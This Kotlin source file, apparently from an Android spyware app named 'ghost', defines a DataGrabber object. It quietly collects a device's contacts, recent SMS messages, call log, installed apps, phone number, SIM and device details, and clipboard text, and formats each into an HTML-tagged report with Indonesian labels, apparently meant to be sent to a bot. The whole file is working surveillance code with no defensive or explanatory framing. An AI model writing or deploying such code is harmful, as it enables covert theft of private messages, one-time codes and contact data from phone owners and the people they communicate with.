package com.ghost.app

import android.content.ClipboardManager
import android.content.Context
import android.os.Build
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.TelephonyManager

object DataGrabber {

    fun contacts(ctx: Context): String {
        val sb = StringBuilder("📇 <b>Kontak</b>\n")
        var count = 0
        try {
            val cur = ctx.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
                null, null, null
            )
            cur?.use {
                while (it.moveToNext() && count < 200) {
                    sb.append("• ${it.getString(0) ?: "?"} — ${it.getString(1) ?: "?"}\n")
                    count++
                }
            }
        } catch (e: Exception) { sb.append("err: ${e.message}\n") }
        if (count == 0) sb.append("(kosong / izin ditolak)\n")
        return sb.toString()
    }

    fun sms(ctx: Context, limit: Int = 60): String {
        val sb = StringBuilder("💬 <b>SMS terakhir</b>\n")
        var count = 0
        try {
            val cur = ctx.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
                null, null, Telephony.Sms.DATE + " DESC"
            )
            cur?.use {
                while (it.moveToNext() && count < limit) {
                    sb.append("• <b>${it.getString(0) ?: "?"}</b>: ${it.getString(1)?.take(150) ?: ""}\n")
                    count++
                }
            }
        } catch (e: Exception) { sb.append("err: ${e.message}\n") }
        if (count == 0) sb.append("(kosong / izin ditolak)\n")
        return sb.toString()
    }

    fun callLog(ctx: Context, limit: Int = 60): String {
        val sb = StringBuilder("📞 <b>Call log</b>\n")
        var count = 0
        try {
            val cur = ctx.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION),
                null, null, CallLog.Calls.DATE + " DESC"
            )
            cur?.use {
                while (it.moveToNext() && count < limit) {
                    val type = when (it.getInt(1)) {
                        CallLog.Calls.INCOMING_TYPE -> "masuk"
                        CallLog.Calls.OUTGOING_TYPE -> "keluar"
                        CallLog.Calls.MISSED_TYPE -> "missed"
                        else -> "?"
                    }
                    sb.append("• ${it.getString(0) ?: "?"} — $type — ${it.getLong(2)}s\n")
                    count++
                }
            }
        } catch (e: Exception) { sb.append("err: ${e.message}\n") }
        if (count == 0) sb.append("(kosong / izin ditolak)\n")
        return sb.toString()
    }

    fun apps(ctx: Context): String {
        val sb = StringBuilder("📦 <b>App terinstall</b>\n")
        try {
            val pm = ctx.packageManager
            val list = pm.getInstalledPackages(0).take(200)
            for (p in list) {
                val label = try { pm.getApplicationLabel(p.applicationInfo).toString() } catch (e: Exception) { p.packageName }
                sb.append("• $label (${p.packageName})\n")
            }
        } catch (e: Exception) { sb.append("err: ${e.message}\n") }
        return sb.toString()
    }

    fun deviceInfo(ctx: Context): String {
        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val sb = StringBuilder("📱 <b>Device info</b>\n")
        sb.append("Model: ${Build.MODEL}\nBrand: ${Build.BRAND}\nManuf: ${Build.MANUFACTURER}\n")
        sb.append("Android: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})\n")
        sb.append("Device: ${Build.DEVICE}\nHardware: ${Build.HARDWARE}\n")
        @Suppress("DEPRECATION")
        val num = tm.line1Number
        if (!num.isNullOrBlank()) sb.append("Nomor: $num\n")
        sb.append("Operator: ${tm.networkOperatorName}\nSIM: ${tm.simCountryIso}\n")
        return sb.toString()
    }

    fun clipboard(ctx: Context): String {
        return try {
            val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = cm.primaryClip
            if (clip == null || clip.itemCount == 0) "📋 clipboard kosong"
            else "📋 <b>Clipboard</b>\n${clip.getItemAt(0).text}"
        } catch (e: Exception) { "📋 err: ${e.message}" }
    }
}
